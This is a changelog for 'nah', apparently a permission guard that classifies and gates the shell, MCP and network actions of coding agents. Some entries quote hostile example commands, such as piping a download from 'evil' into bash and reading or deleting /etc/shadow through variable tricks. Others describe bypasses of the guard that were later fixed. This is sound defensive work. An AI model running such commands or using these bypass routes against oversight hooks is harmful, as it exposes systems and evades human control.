# Changelog

All notable changes to this project will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Changed

- **Claude Code demo simplification** — `/nah-demo` now uses a dedicated
  25-case curated demo file instead of the former 90-case plus variant test
  battery. The slash command is a short product demo; pytest remains the
  regression suite. (nah-962)

## [0.9.0] - 2026-05-21

### Added

- **Guarded Codex headless exec** — `nah run codex exec` and `nah run codex e`
  now guard local headless Codex runs with deterministic PreToolUse
  enforcement, block unresolved asks by default, disable unsupported headless
  tool surfaces, and log headless fallback/sandbox metadata. (nah-936)
- **First-class Nix packaging** — added `default.nix`, a flake, and Nix CI so
  users can install the full `nah` CLI with YAML config and OS keyring support
  through `nix profile add github:manuelschipper/nah`. Nix and
  `pip install "nah[config,keys]"` are now peer recommended CLI install paths;
  the Claude plugin remains a separate Claude-only distribution. Inspired by
  PR #82 from `ryanswrt`. (nah-937)
- **Trusted container exec unwrapping** — opt-in `trusted_containers` config can
  make `docker exec`, `docker container exec`, and simple
  `docker compose exec` transparent for narrow read-like payloads inside exact
  trusted identities, while writes, package scripts, network/database/container
  actions, unknown tools, credential-marker payloads, and unsupported Docker
  flags still ask or block. (nah-924)
- **Codex authority prompt routing** — `nah run codex` now launches Codex with
  `approval_policy="untrusted"` and installs a nah-managed
  `$CODEX_HOME/rules/nah-authority.rules` file so Codex-known-safe command
  prefixes such as `cat`, `git`, `rg`, and shell wrappers still route through
  nah's `PermissionRequest` classifier before execution. `nah codex setup`
  creates or refreshes this authority file, `nah codex doctor` inspects
  approval-memory/MCP drift, and `nah codex remove-setup` removes only the
  nah-managed setup files. (nah-923)
- **Codex confirm-edits mode** — safe project-local `apply_patch` add/update
  edits now allow by default after nah path and content checks, while
  `nah run codex --confirm-edits` keeps those safe edits on Codex's native
  approval path for users who want edit confirmations.
- **Lang-exec LLM review for heredoc scripts** — LLM script-veto prompts now
  include the full inspected heredoc body for interpreter commands such as
  `python3 <<'PY'`, and the review policy now allows plainly read-only local
  inspection scripts instead of escalating solely for ordinary config/log/state
  reads.
- **Codex PreToolUse observation for taint tracking** — `nah run codex` now
  injects Codex `PreToolUse`, `PermissionRequest`, and `PostToolUse` hooks via
  the canonical `features.hooks` flag. PreToolUse observes routine Bash, MCP,
  and `apply_patch` calls without LLM review so taint source reads can be
  tracked before execution, while PermissionRequest remains the enforcement
  hook and PostToolUse confirms execution outcomes. (nah-921)
- **Runtime-neutral session taint tracking** — opt-in `taint` mode now tracks
  successful sensitive reads across Claude, Codex, and terminal guard sessions,
  propagates labels to local writes/repo state, and can audit or enforce
  activation/boundary policies without weakening existing nah decisions.
  Defaults remain off; terminal guard taint support is audit-only in v1.
  (nah-919)
- **Session provenance guard** — opt-in `provenance` mode now tracks
  successful writes from guarded Claude/Codex runs and can pause later
  activation or boundary actions when they operate over session-written files
  or repo state. `context` policies build a bounded session-delta packet for
  LLM review; incomplete packets or uncertain reviews remain asks. (nah-929)
- **Runtime execution outcome logging** — nah now records append-only
  `runtime` and `execution` metadata for Claude, Codex, and terminal guard
  decisions so audit logs can distinguish a pre-execution permission decision
  from an observed tool outcome. Claude PostToolUse/PostToolUseFailure and
  Codex PostToolUse hooks log successful or failed execution without changing
  permission policy, while terminal prompts report denied or approved-to-run
  states without claiming process completion. (nah-920)
- **Non-Git project config with exact-root trust** — nah now loads
  `./.nah.yaml` from the current directory outside Git while keeping Git-root
  config precedence inside repositories. Project config remains tighten-only by
  default; `nah trust-project` / `nah untrust-project` manage exact project
  roots whose config may loosen policy and activate project `classify` rules.
  (nah-918)

### Fixed

- **Agent hook executable transport** — Claude direct hooks and Codex hook
  overrides now call the installed `nah` executable instead of a raw Python
  interpreter plus import path. This fixes Nix and wrapper-based installs where
  the package is importable through the `nah` executable but not through the
  bare interpreter. `nah update claude` migrates old direct-hook settings even
  when the old shim file is missing. Reported in [#83](https://github.com/manuelschipper/nah/issues/83)
  by `ryanswrt`. (nah-943)

### Changed

- **Session provenance outside-project identity** — session-written files
  outside the current project boundary now stay direct-path-only in provenance
  state instead of being aggregated under the current repo; exact path
  activation can still trigger provenance review, but base outside-project
  asks/blocks keep their authority. (nah-939)
- **Decision prompts no longer include auto-allow hints** — ask/block output no
  longer appends remediation suggestions such as `nah trust`, `nah allow`,
  `nah allow-path`, or `nah classify`, because misleading shortcuts can loosen
  policy in the wrong place. Friendly safety reasons and diagnostic metadata
  remain. (nah-935)
- **Taint boundary sinks** — taint tracking now treats network diagnostics,
  database reads, browser interaction/navigation/exec, container actions, git
  history rewrites, remote agent execution, and agent servers as boundary sinks
  by default. Users can tune category membership with
  `taint.categories.*.add/remove`.

### Fixed

- **Bazel test label classification** — local `bazel test` and
  `bazelisk test` target labels now classify as `package_run`, so valid
  Bazel labels such as `//pkg:target` no longer pause as unknown commands
  or get mistaken for filesystem paths. (#62)
- **`jq` read-only classification** — `jq` now classifies as
  `filesystem_read`, so JSON inspection pipelines such as
  `... --json | jq '.metadata'` no longer pause as unknown commands while
  sensitive-path reads still stay guarded.
- **Codex setup command surface** — `nah codex setup` now backs up and fixes
  supported Codex approval-memory/MCP drift, so the separate pre-v1
  `nah codex repair` command has been removed. (nah-925)
- **YAML `llm.mode: on/off` parsing** — PyYAML parses unquoted `on` and `off`
  as booleans, so nah now accepts boolean `true`/`false` anywhere it reads LLM
  mode, including target overrides and inline `--config` overrides.
- **Codex lifecycle guidance** — bare `nah install`, `nah update`, and
  `nah uninstall` now explain that Codex is session-scoped through
  `nah run codex`, and `nah update codex` reports that there is no persistent
  Codex update target.

## [0.8.3] - 2026-05-06

### Added

- **Colored Claude Code safety prompts** — Claude hook permission messages now
  support ANSI color for `nah paused` and `nah blocked` first lines through
  `ui.color` (`auto`, `always`, or `never`) while respecting `NO_COLOR`. (#79)
- **HTTP and REST API intent classification** — visible HTTP API calls now
  classify by service intent: GET/HEAD/OPTIONS use context-resolved
  `service_read`, POST/PUT/PATCH use `service_write`, DELETE and destructive
  paths use `service_destructive`, and remote service actions still participate
  in network data-flow blocks such as `curl ... | bash`. (nah-910)
- **GraphQL operation intent classification** — visible GraphQL operations now
  classify by action intent instead of HTTP method alone: queries and
  subscriptions use context-resolved `service_read`, mutations use
  `service_write`, destructive mutation names/root fields use
  `service_destructive`, and hidden or ambiguous documents stay on ask paths.
  (nah-911)
- **JSON-RPC and MCP method intent classification** — visible JSON-RPC request
  bodies now classify by method intent before REST fallback: read-like methods
  use context-resolved `service_read`, write-like methods use `service_write`,
  destructive methods use `service_destructive`, and generic MCP tool
  invocation stays on an ask path unless a separate trusted tool classifier
  handles it. (nah-912)
- **gRPC CLI method intent classification** — visible `grpcurl` calls now
  classify by method intent: read-like methods and reflection verbs use
  context-resolved `service_read`, write-like methods use `service_write`,
  destructive methods use `service_destructive`, and missing or unknown
  methods stay on ask paths. (nah-913)
- **WebSocket and Socket.IO event intent classification** — visible `wscat`
  and `websocat` commands now distinguish connection-only traffic from sends,
  classify visible event names into `service_read`, `service_write`, or
  `service_destructive`, parse simple visible Socket.IO `42[...]` event
  packets, and keep opaque sends on ask paths. (nah-914)
- **SQLite read-only CLI classification** — explicit read-only `sqlite3`
  inspection commands now classify as `db_read` for simple `SELECT`, safe
  `EXPLAIN`, safe PRAGMA introspection, and safe dot commands; bare SQLite,
  script-fed SQL, mutating SQL, unsafe helpers, and ambiguous forms stay
  `db_write`. (nah-916)
- **Postgres read-only CLI classification** — explicit one-shot `psql`
  inspection commands now classify as `db_read` when they set same-invocation
  `PGOPTIONS` to `default_transaction_read_only`, disable psql startup files,
  and use a narrow read-only SQL allowlist; bare, script-fed, mutating, or
  ambiguous Postgres commands stay on existing `db_write` ask paths. (nah-bqe)

### Fixed

- **Package script argument boundary classification** — `npm run <script> --`,
  `pnpm run <script> --`, `bun run <script> --`, and explicit package exec
  payloads no longer treat child arguments such as `-g`, `--global`, or
  `--target` as package-manager global install flags; malformed or
  package-owned global flags still ask. (nah-917)
- **Curl host extraction skips body and option values** — curl/wget-style host
  detection now ignores option values such as JSON bodies, config files, cert
  paths, and headers before selecting the actual request URL. (nah-909)

## [0.8.2] - 2026-05-06

### Changed

- **Codex runtime simplified around workspace-write** — `nah run codex` now
  uses one protected local interactive preset: Codex `workspace-write`,
  `on-request`, user approvals, nah `PermissionRequest` hooks, and preflight.
  Normal Codex UI flags still pass through, while sandbox/approval overrides
  remain rejected because nah owns that safety boundary. (nah-908)

### Removed

- **Removed Codex flow/edit mode surface** — removed nah-owned `--flow`,
  `--auto-edits`, `--no-sandbox`, explicit `--sandbox`, and hook-side safe
  `apply_patch` auto-allow behavior from `nah run codex`. Safe project edits
  should flow through Codex `workspace-write`; risky `apply_patch` permission
  requests still ask or block after nah path/content checks. (nah-908)

## [0.8.1] - 2026-05-05

### Changed

- **Project license restored to MIT** — current source snapshots and future
  releases are MIT licensed again. The already-published `v0.8.0` package
  metadata briefly reflected the short-lived license transition before this
  reversal.

## [0.8.0] - 2026-05-05

### Breaking

- **Target-first install/update/uninstall commands** — `nah install`, `nah update`, and `nah uninstall` now require an explicit target instead of defaulting to Claude Code. Use `nah install claude`, `nah update claude`, and `nah uninstall claude` for direct Claude hooks; shell and provider targets use the same shape. Bare `nah install` exits nonzero with a guided target list, and the old `--agent` lifecycle shape is no longer the documented product surface. (nah-882)

### Added

- **Human-friendly safety explanations** — terminal guard prompts, Claude Code permission reasons, `nah test`, and compact `nah log` output now show short `nah paused:` / `nah blocked:` messages such as “this can rewrite Git history” while preserving the technical `reason`, action type, hints, and JSON/log diagnostics alongside a new `human_reason` field. (nah-884)
- **Opt-in bash and zsh terminal guard** — added `nah install bash` and `nah install zsh` to protect interactive shell sessions with managed rc-file snippets that classify complete single-line commands before execution. The guard supports status/doctor diagnostics, prompt-on-ask behavior, fail-closed handling for unsupported multiline/here-doc/continuation input, explicit bypass via `nah-bypass <command>` or `NAH_TERMINAL_BYPASS=1`, and terminal decision logging for blocks, denied asks, confirmed asks, bypasses, and errors while keeping allowed terminal commands out of the nah log by default. (nah-882)
- **Target-aware dry runs and config overrides** — added `nah test --target <target>` and `--json`, plus target-scoped config under `targets.<target>` for runtime-specific policies. Bash and zsh targets default to LLM mode off even when a global provider is configured, unless explicitly enabled under their target override. (nah-882)
- **Codex native hook support** — added `nah run codex` for local interactive Codex sessions using Codex `PermissionRequest` hooks instead of shell-wrapper prompts. The runner injects nah-owned hook, sandbox, approval, and dynamic-MCP-disabling overrides, rejects unsafe Codex launch modes, routes Bash and MCP permission requests through nah classification, and adds `nah codex doctor` / `nah codex repair` to block and repair remembered Codex approvals or MCP approval modes that could bypass nah. (nah-897, nah-898)
- **Guarded Codex edit auto-allow** — added `nah run codex --auto-edits` to auto-allow safe project-local `apply_patch` add/update edits after nah path, content, and LLM checks, while default sessions still ask and dangerous patches remain blocked or ask-only. (nah-904)
- **Codex flow mode** — added `nah run codex --flow` as a shortcut for no Codex filesystem sandbox plus safe `apply_patch` auto-allow. Use `--no-sandbox` separately when you want to remove the Codex sandbox without also auto-accepting edits. (nah-906)
- **MCP threat-model audit coverage** — added `mcp_permissions` to `nah audit-threat-model`, covering core MCP permission/runtime tests for Claude Code matcher registration, global-only MCP classification, wildcard safety, database/browser MCP action typing, Codex MCP PermissionRequest hooks, and Codex MCP approval-mode preflight/repair. README and public docs now report 1,807 category coverage hits across 13 tested danger classes. (nah-905)
- **OS keyring-backed LLM secrets** — added `nah key set`, `nah key
  status`, `nah key import-env`, and `nah key rm` for storing optional LLM
  provider keys outside the process environment. Keyring support remains an
  optional `keys` extra, with env-var fallback for existing setups. Thanks
  @ZhangJiaLong90524 for the initial PR and direction.
  ([#65](https://github.com/manuelschipper/nah/pull/65), nah-889)

### Changed

- **Agent session launchers use `nah run`** — the one-shot Claude Code launcher
  is now `nah run claude`, matching `nah run codex`. Legacy `nah claude` exits
  with a pointer to the new command.
- **README and public docs rebranded for coding agents** — refreshed README, site install/CLI/privacy/how-it-works/getting-started docs, and package metadata around “Context aware safety guard for coding agents” instead of a Claude-only positioning, with the user terminal guard treated as an optional bonus. Updated examples to current `nah paused:` / `nah blocked:` copy and documented Codex doctor/repair plus `nah log --llm`. (nah-899)
- **Terminal guard documented as opt-in shell protection** — README, install docs, configuration docs, privacy copy, and lifecycle target help now describe bash/zsh terminal protection as opt-in per shell without preview labeling.
- **Minimal taxonomy profile deprecated** — `profile: minimal` now warns and behaves like `profile: full`, leaving `full` and `none` as the two supported profile shapes. The old minimal classification data has been removed so custom classifiers are not evaluated against a weaker built-in baseline.
- **Install lifecycle targets stay runtime-only** — removed the unreleased `nah install openrouter` / `nah uninstall openrouter` convenience path so lifecycle commands only install or remove nah from guarded runtimes (`claude`, `bash`, `zsh`). LLM providers remain configured through global config. (nah-882 follow-up)
- **Install docs now start with a chooser** — README and site install docs now separate the Claude Code plugin, PyPI CLI/direct-hook, terminal guard, config extra, and LLM provider configuration more clearly, and stale setup examples now use explicit target-first lifecycle commands instead of bare `nah install`. (nah-885)

### Fixed

- **Windows drive-letter paths route through trusted paths** — `nah trust
  C:/Projects` and `nah trust D:\work` now write to `trusted_paths` instead of
  being mistaken for network hosts in `known_registries`. Thanks @enermark.
  ([#69](https://github.com/manuelschipper/nah/pull/69))
- **Sparse environments keep useful log user attribution** — structured
  decision logs now fall back from `USER` to `LOGNAME`, `USERNAME`, and finally
  `getpass.getuser()` before leaving the user field empty.
- **Codex flow edit approval race** — safe `apply_patch` edits in `nah run codex --flow` now trust direct Codex patch payloads and retry the Codex transcript briefly when direct patch text is unavailable, fixing cases where the PermissionRequest hook fell back to the native edit prompt before nah could inspect the patch. (nah-907)
- **Quoted output text no longer becomes a fake redirect** — Bash classification
  now preserves `>` characters that appear inside quoted or backslash-escaped
  `printf` / `echo` text before redirect decomposition, so prose such as
  `<key>` or `->` no longer prompts as a filesystem write while real unquoted
  redirects to sensitive paths still block. (nah-902)
- **Claude launcher rejects unsafe bypass modes** — `nah run claude` now refuses
  `--dangerously-skip-permissions`, `--enable-auto-mode`, and
  `--permission-mode bypassPermissions` because those modes can run tool calls
  outside the guarded permission path.
- **Shell control-flow bodies are classified by payload** — `for ...; do ...; done`, `while ...; do ...; done`, and `if ...; then ...; fi` now expose their executable inner commands to the classifier instead of stopping at reserved words like `for`, `do`, and `done`. Literal `for` item lists are expanded into the loop body so safe batch GitHub/GitLab CLI API reads can allow while sensitive paths still block; dynamic loop values and control-flow body command substitutions fail closed. Tracks [#78](https://github.com/manuelschipper/nah/issues/78).
- **Unwrapped shell bodies mirror top-level variable expansion** — `bash -c 'BAD=/etc/shadow; rm "$BAD"'` and control-flow variants now apply the same intra-chain `$VAR` expansion used for top-level Bash commands, closing a sensitive-path bypass inside shell wrappers.
- **GitLab API form writes ask cleanly** — `glab api --form ...` now classifies as `network_write`, including multipart file-upload forms, and `gh` / `glab` API prompt copy no longer mistakes field values such as `file=@image.png` for network hosts.
- **Bash terminal ask denials clear the prompt line** — denied ask decisions now cancel and return to an empty prompt instead of restoring the same command line and making the shell look stuck. (nah-882 follow-up)
- **Terminal guard reload hint replaces active snippets** — `nah install bash` / `nah update bash` now print a reload command that clears terminal guard environment and replaces the shell, so an already-running shell can load the updated guard without running startup files inside the old in-memory Readline hook. (nah-882 follow-up)
- **Bash terminal guard preserves normal prompt redraws** — bash now filters the Readline buffer and lets Bash execute accepted commands normally, instead of running commands inside the Readline callback. Confirmed commands run through normal Bash execution, preserving shell state such as `cd` and `source`. (nah-882 follow-up)
- **`nah update` no longer looks like a project file write** — `nah install` / `nah update` now classify as nah lifecycle commands instead of treating target names such as `bash` or `update` as filesystem paths like `~/bash` or `~/update` when the terminal guard runs outside a Git project. (nah-882 follow-up)
- **Bash rc reloads replace the active guard** — sourcing `.bashrc` in an already-guarded bash shell now refreshes nah's active function and key bindings instead of skipping the snippet because `NAH_TERMINAL_GUARD_ACTIVE` was already set. The original pre-nah binding metadata is still captured only once for diagnostics. (nah-882 follow-up)
- **Bash ask prompts use the hidden decision helper** — bash ask decisions now prompt through `nah _terminal-decision --confirm` instead of shell `read` inside the Readline callback or a pending `y` / `n` command line. This keeps normal `Run anyway? [y/N]` prompts responsive without leaking helper commands into the prompt or history. (nah-882 follow-up)
- **Bash ask confirmations read raw terminal keys** — the hidden terminal prompt now reads a single `y`, `n`, Enter, or Ctrl-C key so confirmation works while Bash Readline has the tty in raw mode. (nah-882 follow-up)
- **Bash accept-line newlines are normalized** — the terminal guard now trims the single trailing newline that Bash Readline can pass to the hidden helper, so commands like `nah test '...' --json` are classified normally instead of being mistaken for multiline input. (nah-882 follow-up)
- **LLM provider setup warnings stay out of guard prompts** — missing LLM API keys no longer create noisy standalone stderr lines in terminal guard prompts or Codex permission hook output; expected provider/key misses are logged as quiet review metadata instead. (nah-897)

## [0.7.1] - 2026-04-20

### Added

- **Official Claude plugin marketplace submission prep** — polished the generated Claude Code plugin metadata with repository, author URL, and discovery keywords, rewrote the copied plugin README so release artifacts no longer describe themselves as local-only scaffolds, and added an Anthropic marketplace submission packet covering source refs, runtime behavior, data handling, trust/safety notes, and validation commands. Tests now assert the generated plugin and marketplace artifacts keep this submission-ready metadata and avoid regressing to local-only wording. (nah-883)

## [0.7.0] - 2026-04-19

### Added

- **Local Claude Code plugin distribution prep** — added a local-only plugin scaffold and `scripts/build_claude_plugin.py` artifact builder that copies the stdlib-only nah runtime into an ignored `dist/claude-plugin/nah` directory, generates Claude hook matchers from the canonical agent matcher list, and keeps hook commands rooted at `${CLAUDE_PLUGIN_ROOT}` with no package-manager or network bootstrap. CLI install/update/uninstall/`nah claude` paths now detect enabled nah plugins, avoid silent mixed plugin/direct-hook setups, and preserve plugin-managed state during uninstall. (nah-879)
- **Claude Code plugin marketplace artifact generation** — `scripts/build_claude_plugin.py` can now generate and freshness-check a full self-hosted marketplace root at `dist/claude-marketplace`, with `.claude-plugin/marketplace.json` pointing to the generated self-contained `plugins/nah` artifact instead of the source template. Added plugin beta install docs covering opt-in plugin mode, legacy direct-hook migration, rollback, and the intentional absence of bundled PyYAML. (nah-880)
- **Automated Claude plugin marketplace releases** — the existing tagged release workflow now builds, freshness-checks, release-verifies, and Claude-validates the generated marketplace tree before publishing PyPI, then publishes that exact marketplace artifact to the `claude-marketplace` branch with immutable `claude-plugin-vX.Y.Z` tags. Added release scripts and tests so plugin metadata, source tag, package version, changelog, and bundled runtime cannot silently drift. (nah-881)

## [0.6.4] - 2026-04-18

### Fixed

- **Conservative kubectl read classification with global flag support** — `kubectl -n <ns> logs ...`, `kubectl --namespace=<ns> get pods`, and other known low-risk Kubernetes inspection commands now classify as `container_read` instead of falling through to `unknown`. The classifier strips recognized kubectl global flags before matching subcommands, while malformed flags, mutations, exec/copy/port-forward paths, detailed object dumps (`-o yaml/json`), secrets, configmaps, service accounts, and custom resources remain on the `unknown` ask path. Tracks [#67](https://github.com/manuelschipper/nah/issues/67), superseding the broad prefix-table approach from [#51](https://github.com/manuelschipper/nah/pull/51) and the global-flag stripping branch [#68](https://github.com/manuelschipper/nah/pull/68).
- **Explicit-delimiter `mise` wrappers preserve payload classification** — `mise exec -- <cmd>`, `mise x -- <cmd>`, and `mise watch -- <cmd>` now classify and resolve context from the command after `--`, so safe Git/GitHub CLI reads allow, script and inline-code inspection use the inner payload, and unknown tools launched through `mise` still ask. Redirected literal content is inspected through the wrapper while preserving the outer redirect target guard. (nah-878)
- **GitHub CLI API reads no longer look like script execution** — `gh api ...` now uses a full-profile flag classifier instead of the generic `lang_exec` table entry, so read-only API calls such as `gh api repos/owner/repo/contributors --jq length` classify as `git_safe` and no longer ask with `script not found: .../api`. POST-like methods, request bodies, implicit POST field flags, typed `--field key=@file` payloads, and `--input` stay on the existing `network_write` ask path, while `gh extension exec` remains `lang_exec`. (nah-32c)
- **Direct script arguments no longer resolve as script paths** — `nah` now treats `tokens[0]` as the inspected script for direct script invocations such as `./bin/release.sh 2.0.0 prerelease --label rc`, instead of scanning positional arguments and asking on `script not found: <project>/2.0.0`. Missing direct scripts still fail closed, but the prompt now names the missing script rather than the first argument. Reported in [#70](https://github.com/manuelschipper/nah/issues/70); PR behavior integrated from [#72](https://github.com/manuelschipper/nah/pull/72) by [@srgvg](https://github.com/srgvg). (nah-877)
- **Windows hook shim and update compatibility** — the generated `nah_guard.py` shim now includes an explicit UTF-8 source cookie and treats old non-UTF-8 hook files as stale during update, rewriting them safely instead of crashing while checking for identical content. `nah update` now handles both current string-style Claude hook matchers and legacy object-style `{"tool_name": [...]}` matchers, preserves object-style entries when present, and creates a missing `hooks.PreToolUse` list before adding new tool matchers. Reported in [#58](https://github.com/manuelschipper/nah/pull/58) by [@zacbrown](https://github.com/zacbrown).

## [0.6.3] - 2026-04-17

### Added

- **Wildcard support in `classify` entries** — classify entries now accept a trailing `*` wildcard on the last token. `mcp__github*` matches every tool under the github MCP server, letting one line cover a whole MCP server instead of enumerating each tool. Exact entries always beat wildcard entries at equal prefix length, so a specific override still wins over a server-wide rule. Invalid patterns (leading `*`, mid-string `*`, bare `*`, multi-`*`) are rejected at `nah classify` write time and skipped with a stderr warning if they appear in hand-edited YAML. FD-024 semantics — implicit prefix matching remains forbidden, wildcards must be written explicitly — are preserved. Requested in [#76](https://github.com/manuelschipper/nah/issues/76) (nah-875)

### Fixed

- **Atomic config writes** — `_write_config` in `src/nah/remember.py` now writes to a sibling temp file and `os.replace`s it over the target. Previously it called `open(path, "w")` which truncates the file to zero bytes before writing; concurrent Claude Code sessions calling `_read_config` during that window could observe an empty file, parse it as `{}`, and later persist a single rule as the whole config — a full config wipe was reported in production. The fix resolves symlinks on the target (preserving dotfile-managed links), preserves the file's existing mode (or defaults to `0o644`), writes with explicit UTF-8 encoding, fsyncs the tempfile before rename, and fsyncs the parent directory on POSIX as a durability hedge. All six `_write_config` call sites (`write_action`, `write_classify`, `write_trust_host`, `write_allow_path`, etc.) inherit the fix without modification. Lost-update races where two writers both persist stale state are explicitly deferred — that requires advisory file locking. Reported by [@0reo](https://github.com/0reo) ([#66](https://github.com/manuelschipper/nah/issues/66), nah-876)
- **Intra-chain `$VAR` expansion before sensitive-path checks** — Bash classification now propagates literal env assignments across `&&` / `||` / `;` stages and expands `$NAME` / `${NAME}` in later consumer tokens, so `BAD=/etc/shadow && cat "$BAD"` blocks where it previously allowed. Pipe `|` clears the var map (subshell boundary); unsafe RHS values (`$`, backticks, command substitution) are never propagated; the executed command string is never mutated. Covers bare and `export NAME=value` assignment forms. Bypass identified by srgvg ([#74](https://github.com/manuelschipper/nah/pull/74), nah-874)

## [0.6.2] - 2026-04-14

### Added

- **Default-config dry runs** — `nah test --defaults` now ignores user/project config and uses packaged defaults for one dry-run classification, keeping `/nah-demo` base battery results stable under customized local configs while preserving `--config` for explicit variants (nah-jpv)

### Fixed

- **`find -exec` shell-wrapper classification** — Bash classification now unwraps `find -exec` / `-execdir` / `-ok` / `-okdir` payloads through the same inner-command pipeline as direct `sh -c` and `bash -lc`, so hidden network access and `curl | sh` composition no longer collapse to project-local filesystem paths while safe grep and project-local cleanup still allow ([#52](https://github.com/manuelschipper/nah/pull/52), nah-871)
- **Shell comment prefix bypass** — Bash command classification now treats top-level newlines as command separators and strips shell comments before per-stage tokenization, so comment-prefixed commands such as `# note\ncat /etc/shadow` no longer collapse to `ALLOW` / `empty command` while quoted hashes and heredoc content remain intact ([#71](https://github.com/manuelschipper/nah/issues/71), nah-870)

## [0.6.1] - 2026-04-14

### Added

- **Azure OpenAI LLM provider** — added `azure` as an optional LLM provider with Azure `api-key` authentication, default `AZURE_OPENAI_API_KEY`, Responses API support, chat-completions URL support, and deployment-specific optional model handling. Behavior reported in PR #56 by `yingyangyou` (nah-869)
- **Windows compatibility classification** — Windows config/log paths now use `%APPDATA%\nah` when available, hook installation avoids POSIX chmod assumptions on Windows, common Windows read-only/process commands classify deterministically, Windows shell inline execution routes to `lang_exec`, and destructive PowerShell/cmd content patterns are detected without relying on LLM review. Behavior reported in PR #55 by `yingyangyou` (nah-867)
- **Safe stdlib `python -m` utility classification** — `python -m json.tool`, `tabnanny`, `tokenize`, `py_compile`, and `compileall` now classify as bounded filesystem read/write operations when the invocation is clean, while malformed or import/env/cwd-influenced forms fail closed to `lang_exec` (mold-6)

### Fixed

- **Transparent formatter pipe false positives** — pipelines ending in safe transparent formatters such as `curl localhost | python3 -m json.tool` no longer trip the `network | exec` remote-code-execution block, while dangerous chains such as `curl evil | python3 -m json.tool | bash` still block (mold-5)
- **Git worktree project boundaries** — project-boundary checks now include the main repo root derived from Git's common dir when running from a linked worktree, so shared repo files such as `.claude/skills/` and `.claude/agents/` no longer prompt as outside-project from `.worktrees/<branch>`. `allow_paths` also works across related main/worktree roots while unrelated roots stay isolated ([#59](https://github.com/manuelschipper/nah/issues/59), nah-865)

## [0.6.0] - 2026-04-13

### Added

- **Codex and Codex companion taxonomy** — added agent action types plus Phase 2 classification for Codex CLI and Codex companion commands, including read-only metadata, write/state changes, local/remote agent execution, server startup, and bypass-flag escalation (mold-15)
- **Threat-model coverage audit** — added `nah audit-threat-model` CLI subcommand backed by `src/nah/audit_threat_model.py`, with module-level rule tests, `TestContainerDestructiveCoverage`, and `TestPackageEscalationCoverage` so threat-model claims can be mapped back to concrete pytest coverage and the container/package escalation gaps are exercised explicitly. Output formats: `markdown` (default), `json`, `summary` (mold-8)
- **Playwright MCP browser taxonomy expansion** — added 6 new action types: `browser_read`, `browser_interact`, `browser_state`, `browser_navigate`, `browser_exec`, and `browser_file`. Bundled classification now covers both `mcp__plugin_playwright_playwright__browser_*` and `mcp__playwright__browser_*` tool names, eliminating prompts for the 58 read/interact/state tools while keeping navigate/exec/file tools on explicit ask paths with browser-specific reasons (mold-10)
- **Container + systemd taxonomy expansion** — added 6 new action types: `container_read`, `container_write`, `container_exec`, `service_read`, `service_write`, and `service_destructive`. Full-profile docker/podman coverage now includes logs/inspect/stats/build/exec/compose/service flows, `systemctl`/`journalctl` no longer fall through to `unknown`, minimal profile gains read-only container/service coverage, and sensitive path defaults now cover Docker daemon and systemd config/socket paths (mold-2)
- **Unified LLM mode** — merged 4 fragmented LLM entry points into 2 clean paths. Path 1 (ask refinement): combined safety+intent prompt runs in `main()` for ask decisions, uses user-only transcript and CLAUDE.md for context, can only relax ask→allow. Path 2 (content veto): stays in handlers for write/script inspection, hard-capped to ask. Config simplified to `llm.mode: off|on` (one switch). LLM can never block — only allow or ask. Session state tracks consecutive denials (3→disable). `nah log --llm` filter, `nah test` uses unified path. Backward compat: `llm.enabled: true` still works. Deprecation warning for removed `llm.max_decision` (nah-5no)
- **Inline code inspection** — `python3 -c 'print(1)'`, `node -e`, `ruby -e`, `perl -e`, `php -r` inline code is now content-scanned instead of blindly prompting. Safe inline → allow, dangerous patterns → ask/block. LLM veto gate fires on clean inline code (same defense-in-depth as script files). LLM prompt now includes inline code for enrichment (nah-koi.1)
- **Shell init file protection** — `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`, `~/.zshenv`, `~/.bash_aliases`, and 8 more shell init files now guarded as sensitive paths (`ask` policy). Prevents silent alias injection persistence. Includes `.bashrc.d/` and `.zshrc.d/` directories (nah-wdd)
- **Safety list hardening** — expanded coverage for credential directories (`~/.kube`, `~/.docker`, `~/.config/az`, `~/.config/heroku`), sensitive basenames (`.pgpass`, `.boto`, `terraform.tfvars`), exec sinks (`lua`, `R`, `Rscript`, `make`, `julia`, `swift`), and decode-to-exec pipe detection (`gzip -d`, `zcat`, `bzip2 -d`, `openssl enc`, `unzip -p`, and more) (nah-brq)

### Removed

- **Beads taxonomy** — removed `beads_safe`, `beads_write`, and `beads_destructive` action types plus all `bd` classify entries and `bd dolt start/stop/killall` process_signal entries. The beads CLI (`bd`) is superseded by `molds`; users who classified molds commands under beads types should reclassify under generic types (`filesystem_read`, `filesystem_write`, `filesystem_delete`).

### Changed

- **Public docs readiness** — refreshed README and site docs for the current guarded tool surface, LLM configuration/mechanics, database target behavior, safety-list defaults, profile counts, and `nah test --tool` support.
- **LLM reasoning observability** — LLM responses now carry both a short prompt-safe `reasoning` summary and a longer `reasoning_long` explanation for logs and `nah test`, while Claude-visible prompts continue to use the compact summary.
- **Write/Edit LLM review mechanics** — Write/Edit, MultiEdit, and NotebookEdit LLM handling can now relax eligible project-boundary asks to allow when the edit is narrow, safe, and clearly intended, while still escalating risky deterministic allows to ask and keeping sensitive/config/content-pattern asks human-gated (nah-858)
- **LLM eligibility presets** — `llm.eligible: strict` preserves the old conservative default, `default` now includes `unknown`, `lang_exec`, non-sensitive `context`, `package_uninstall`, `container_exec`, and `browser_exec`, and `all` remains the opt-in route for every ask decision. Classified fallback/MCP tools now include stage metadata so taxonomy eligibility applies consistently (nah-856)
- GitHub Actions now publishes a non-gating threat-model coverage report to the job summary after the main pytest run, so PRs show per-category audit counts without changing the enforcement gate (`pytest tests/`) (mold-8)
- Docker and podman read-only inspection commands like `ps`, `images`, `logs`, `inspect`, and compose read ops now classify as `container_read` instead of `filesystem_read`. Default behavior stays `allow`; logs and `nah types` now use the container-specific action type.
- Transcript-derived LLM context now reformats slash-command skill invocations, labels Claude Code skill meta blocks as `Skill expansion`, deduplicates repeated expansions by skill name, and caps each captured skill body to 2048 chars (mold-3)

### Fixed

- **Codex companion script variables** — same-command discovery patterns like `CODEX_SCRIPT=$(ls ~/.claude/plugins/cache/openai-codex/codex/*/scripts/codex-companion.mjs | head -1) && node "$CODEX_SCRIPT" ...` now classify as Codex companion delegation instead of generic missing-script `lang_exec` asks (nah-859)
